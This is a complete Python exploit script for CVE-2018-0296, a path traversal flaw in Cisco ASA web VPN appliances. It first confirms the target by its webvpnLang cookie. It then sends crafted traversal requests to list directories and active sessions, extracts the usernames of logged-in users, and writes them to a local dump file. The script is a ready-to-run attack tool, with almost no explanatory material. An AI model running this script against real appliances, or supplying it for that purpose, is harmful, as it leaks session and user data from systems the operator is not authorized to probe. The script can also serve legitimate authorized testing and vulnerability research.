#!/usr/bin/python3

import sys
is_py2 = sys.version[0] == "2"
if is_py2:
    print('[!] Python 2 is dead! Please use Python 3.')
    sys.exit(1)
import requests
from urllib.parse import urlparse, urljoin
import os
import re

requests.packages.urllib3.disable_warnings()
url = sys.argv[1]
regexSess = r"([0-9])\w+'"
regexUser = r"(user:)\w([^']*)"
dir_path = os.path.dirname(os.path.realpath(__file__))
filelist_dir = "+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=/"
CSCOE_dir = "+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
active_sessions = "+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=/sessions/"
logon = "+CSCOE+/logon.html"

def banner():
    print("""
                Cisco ASA - Path Traversal
                    CVE-2018-0296
        Author: Yassine Aboukir(@yassineaboukir)
        """)

def is_asa(): # Verify target is using Cisco ASA
    try:
        is_cisco_asa = requests.get(urljoin(url,logon), verify=False, allow_redirects=False)
    except:
        print("[!] Couldn't establish connection with the target host.")
        sys.exit(1)

    if "webvpnLang" in is_cisco_asa.cookies:
        pass
    else:
        print("[-] Couldn't confirm it's Cisco ASA. E.g: https://vpn.example.com/+CSCOE+/logon.html\n")
        sys.exit(1)

def extract_info():
    #Extract directory content
    try:
        filelist_r = requests.get(urljoin(url,filelist_dir), verify=False, timeout = 15)
        CSCOE_r = requests.get(urljoin(url,CSCOE_dir), verify=False, timeout = 15)
        active_sessions_r = requests.get(urljoin(url,active_sessions), verify=False, timeout = 15)
        if str(filelist_r.status_code) == "200":
            with open(urlparse(url).hostname + ".txt", "w") as cisco_dump:
                cisco_dump.write("[+] Directory: \n {}\n[+] +CSCEO+ Directory:\n {}\n[+] Active sessions:\n {}\n[+] Active Users:\n".format(filelist_r.text, CSCOE_r.text, active_sessions_r.text))

                #Extract user list
                matches_sess = re.finditer(regexSess, active_sessions_r.text)
                for match_sess in matches_sess:
                    active_users_r = requests.get(urljoin(url, active_sessions + str(match_sess.group().strip("'"))), verify = False, timeout = 15)
                    matches_user = re.finditer(regexUser, active_users_r.text)
                    for match_user in matches_user:
                        cisco_dump.write(match_user.group() + "\n")

            print("[+] Host is vulnerable! The dump was saved to {}".format(dir_path))
        else:
            print("[-] The host doesn't appear to be vulnerable.")
    except:
        print("[-] Connection timed out! Could be on purpose (Timeout set to 15s) to prevent DoS'ing the server, so please run the script one last time to confirm.")
        sys.exit(1)

if __name__ == '__main__':
    banner()
    is_asa()
    extract_info()
